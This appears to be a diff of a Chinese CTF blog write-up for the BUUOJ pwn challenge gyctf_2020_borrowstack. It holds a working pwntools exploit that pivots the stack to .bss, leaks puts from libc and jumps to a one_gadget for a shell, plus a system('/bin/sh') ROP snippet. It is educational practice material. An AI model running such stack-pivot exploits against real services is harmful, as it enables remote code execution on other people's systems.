@@ -9,7 +9,7 @@
     
     <title>
         
-            gyctf-2020-borrowstack |
+            gyctf_2020_borrowstack |
         
         b1nary
     </title>
@@ -161,7 +161,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        gyctf-2020-borrowstack
+                        gyctf_2020_borrowstack
                     </div>
                 
 
@@ -195,21 +195,30 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Thu Aug 14 2025 20:55:43 GMT+0800">2025-08-14 20:55:43</span>
+                    <span class="datetime" data-updated="Tue Aug 26 2025 16:28:35 GMT+0800">2025-08-26 16:28:35</span>
                 </span>
             
         
 
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/exercise-pwn/">exercise_pwn</a></li>
+                        
+                    
+                </ul>
+            </span>
         
 
         
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/BUU/">BUU</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a></li>
                         
                     
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/one-gadget/">one_gadget</a></li>
@@ -237,55 +246,19 @@
                     
 
                     
-                         <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727182130118.png"  alt="image-20250727182130118"></p>
+                         <p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#gyctf_2020_borrowstack" >题目<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727182130118.png"  alt="image-20250727182130118"></p>
 <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727182152629.png"  alt="image-20250727182152629"></p>
 <p>思路：</p>
-<p>让在bank上构造rop链，通过buf跳转过去，泄露libc找到one_gadget</p>
+<p>bank是bss段上的，栈空间不足,把泄露libc的东西放在bank上，通过buf跳转到bank泄露libc去找到libc基址</p>
+<p>然后加上对应libc的one_gadget偏移，跳转过去执行ong_gadgat就可以了</p>
 <h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#p=process(&quot;./gyctf_2020_borrowstack&quot;)</span><br><span class="line">p=remote(&quot;node5.buuoj.cn&quot;,27049)</span><br><span class="line">elf=ELF(&quot;./gyctf_2020_borrowstack&quot;)</span><br><span class="line">bank=0x0000000000601080</span><br><span class="line">leave=0x400699</span><br><span class="line">rdi=0x0400703</span><br><span class="line">ret=0x4004c9</span><br><span class="line">puts_plt=elf.plt[&quot;puts&quot;]</span><br><span class="line">puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line">main=0x400626</span><br><span class="line"></span><br><span class="line">payload1=b&#x27;a&#x27;*0x60+p64(bank)+p64(leave)</span><br><span class="line">p.recvuntil(b&quot;want&quot;)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;now!&quot;)</span><br><span class="line">payload2=p64(ret)*20+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.send(payload2)</span><br><span class="line">a=p.recvline()</span><br><span class="line">puts= u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line">libc_base=puts-libc.dump(&quot;puts&quot;)</span><br><span class="line"></span><br><span class="line">one=libc_base+0x4526a</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x68+p64(one)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><h3 id="函数跳转"><a href="#函数跳转" class="headerlink" title="函数跳转"></a>函数跳转</h3><p>第一段 payload 是发生在 <strong>第一次 <code>read()</code></strong>，它虽然劫持了 <code>rbp</code> 和返回地址，但程序还在 <code>vuln()</code> 函数里。</p>
-<ul>
-<li>也就是说：<strong>你执行完 <code>read()</code> 后，还没 leave、还没 ret！</strong></li>
-<li>然后继续执行 <code>puts(&quot;now!&quot;)</code> 和第二个 <code>read()</code>。</li>
-<li><strong>第二个 <code>read()</code> 这时候读取的目标还是 <code>buf</code>，但是 <code>rsp</code> 已经变成 <code>.bss</code></strong>（你通过 <code>rbp=bank</code>, 之后再执行 <code>leave</code> 实现的）。</li>
-</ul>
-<p>🔁 怎么理解栈迁移后还能 read？</p>
-<p>你第一次发送：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*0x60 + p64(bank) + p64(leave)</span><br></pre></td></tr></table></figure>
-
-<p>但这段 payload <strong>不是立即执行的！</strong></p>
-<blockquote>
-<p>它只是<strong>被 read 读取到了栈上的 buf 中，覆盖了原来的返回地址（ret）和 rbp 而已。</strong></p>
-</blockquote>
-<ul>
-<li><code>read()</code> 函数结束 → 函数栈继续执行 → 执行 <code>puts(&quot;now!&quot;)</code></li>
-<li>执行第二个 <code>read()</code>，程序才停下来等待输入</li>
-<li>直到 <code>vuln()</code> 函数 return，leave 和 ret 才会被执行！</li>
-</ul>
-<p><strong>🧠 实际流程如下：</strong></p>
-<ol>
-<li>第一次 <code>read</code> 读取你的第一个 payload：<ul>
-<li>覆盖了 <code>rbp = bank</code></li>
-<li>覆盖了 <code>ret = leave</code></li>
-</ul>
-</li>
-<li>但程序并<strong>没有立刻跳转</strong>，它只是把 payload 写入 buf，继续执行 vuln 函数：<ul>
-<li><code>puts(&quot;now!&quot;)</code></li>
-<li>第二个 <code>read()</code> 等待你输入（此时 <code>rsp = buf</code>, 但即将栈迁移）</li>
-</ul>
-</li>
-<li>函数执行到结尾，开始执行 <code>leave; ret</code><ul>
-<li>把 <code>rsp = bank</code>，开始执行你布置在 <code>.bss</code> 上的第二段 ROP 链！</li>
-</ul>
-</li>
-</ol>
-<p>✅ 所以，第一次 payload 并不让程序跳转，只是<strong>布置好了栈迁移准备</strong></p>
-<p>第二次 <code>read()</code> 是程序自己继续执行逻辑中调用的。</p>
-<h3 id="p64-ret-0x20"><a href="#p64-ret-0x20" class="headerlink" title="p64(ret)*0x20"></a>p64(ret)*0x20</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>当 <code>main</code> 函数<strong>再次被执行时</strong>（因为你的 ROP 链最后跳转到了 <code>main</code> 函数的地址）：</p>
+<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><h3 id="p64-ret-0x20"><a href="#p64-ret-0x20" class="headerlink" title="p64(ret)*0x20"></a>p64(ret)*0x20</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>当 <code>main</code> 函数<strong>再次被执行时</strong>（因为你的 ROP 链最后跳转到了 <code>main</code> 函数的地址）：</p>
 <ol>
 <li><p>程序会为新的 <code>main</code> 函数调用<strong>重新分配一个栈帧</strong>。</p>
 </li>
@@ -343,19 +316,19 @@
 </li>
 </ul>
 <p>如果 <code>N</code> 过大，例如 <code>N=100</code>，那么 <code>p64(ret)*100</code> 就需要 <code>100 * 8 = 800</code> 字节。这已经远远超过了 <code>read</code> 函数能读取的最大 <code>0x100</code> (256) 字节。</p>
-<h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><p><code>one_gadget</code> 是一个命令行工具，它用于分析 <code>libc</code> 库文件，并找到其中可以直接用于获取 shell 的指令序列的偏移量。</p>
+<h3 id="one-gadget和LibcSearcher"><a href="#one-gadget和LibcSearcher" class="headerlink" title="one_gadget和LibcSearcher"></a>one_gadget和LibcSearcher</h3><p><code>one_gadget</code> 是一个命令行工具，它用于分析 <code>libc</code> 库文件，并找到其中可以直接用于获取 shell 的指令序列的偏移量。</p>
 <p>与传统的 <code>system(&quot;/bin/sh&quot;)</code> 方法相比，<code>one_gadget</code> 通常更简洁，因为它只需要一个地址就能获取 shell，而不需要 <code>pop_rdi</code> gadget、<code>&quot;/bin/sh&quot;</code> 字符串的地址和 <code>system</code> 函数的地址。 此外，<code>one_gadget</code> 通常对环境（包括栈对齐）的要求更宽松。</p>
 <p>用法和shellcode一样</p>
-<p><strong>找到位置即可</strong></p>
-<p>把泄露出来的地址在<a class="link"   target="_blank" rel="noopener" href="https://libc.blukat.me/?q=puts:690&l=libc6_2.23-0ubuntu11_amd64" >libc匹配网站<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>找到位置即可ibc</strong></p>
+<p>把泄露出来的函数地址在<a class="link"   target="_blank" rel="noopener" href="https://libc.blukat.me/?q=puts:690&l=libc6_2.23-0ubuntu11_amd64" >libc网站<i class="fas fa-external-link-alt"></i></a>匹配</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727163636808.png"  alt="image-20250727163636808"></p>
 <p>之后下载匹配的的libc版本</p>
 <p>用命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget /home/p0ach1l/Documents/libc6_2.23-0ubuntu11_amd64.so</span><br></pre></td></tr></table></figure>
 
 <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727163729001.png"  alt="image-20250727163729001"></p>
-<p>找到合适的偏移量即可</p>
-<p>所以，<code>LibcSearcher</code> 匹配的版本是<strong>它自己数据库中</strong>的版本，而不是你本地计算机上 <code>/lib/x86_64-linux-gnu/libc.so.6</code> 这样的文件。</p>
+<p>找到合适的偏移量即可（地址下面是它要满足的条件）</p>
+<p><code>LibcSearcher</code> 匹配的版本是<strong>它自己数据库中</strong>的版本，而不是你本地计算机上 <code>/lib/x86_64-linux-gnu/libc.so.6</code> 这样的文件。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">payload=b&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br></pre></td></tr></table></figure>
 
 <p>是用它LibcSearcher匹配的版本，而one_gadget是用我们匹配下载的libc文件去实际计算的，更准确</p>
@@ -367,8 +340,7 @@
 </li>
 <li><p><code>libc</code> 版本号（如 <code>2.23</code>）可能相同，但不同的发行版或编译选项（如 <code>ubuntu10</code> vs <code>ubuntu11</code>，或不同的构建日期）会导致内部函数和字符串的具体相对位置存在细微差异。即使 <code>puts</code> 和某个 <code>one_gadget</code> 的偏移恰好相同，<code>system</code> 或 <code>&quot;/bin/sh&quot;</code> 的偏移可能就不同了。</p>
 </li>
-<li><p>当你用错误的偏移量计算出 <code>system</code> 和 <code>&quot;/bin/sh&quot;</code> 的地址并尝试跳转时，程序会因为 <code>RIP</code> 指向无效地址或 <code>system</code> 函数接收到无</p>
-<p>效参数而崩溃（<code>dumped core</code>）。</p>
+<li><p>当你用错误的偏移量计算出 <code>system</code> 和 <code>&quot;/bin/sh&quot;</code> 的地址并尝试跳转时，程序会因为 <code>RIP</code> 指向无效地址或 <code>system</code> 函数接收到无效参数而崩溃（<code>dumped core</code>）。</p>
 </li>
 </ul>
 
@@ -383,11 +355,11 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/BUU/">BUU</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
                                     </li>
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
                                     </li>
                                 
                                     <li class="tag-item border-box">
@@ -410,14 +382,14 @@
                             <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
-                                   href="/2025/07/29/ez-pz-hackover-2016/"
-                                   title="ez_pz_hackover_2016"
+                                   href="/2025/07/31/2021-%E9%B9%A4%E5%9F%8E%E6%9D%AF-littleof/"
+                                   title="[2021 鹤城杯]littleof"
                                 >
                                     <span class="left arrow-icon flex-center">
                                         <i class="fas fa-chevron-left"></i>
                                     </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">ez_pz_hackover_2016</span>
+                                        <span class="post-nav-title-item text-ellipsis">[2021 鹤城杯]littleof</span>
                                         <span class="post-nav-item">Prev posts</span>
                                     </span>
                                 </a>
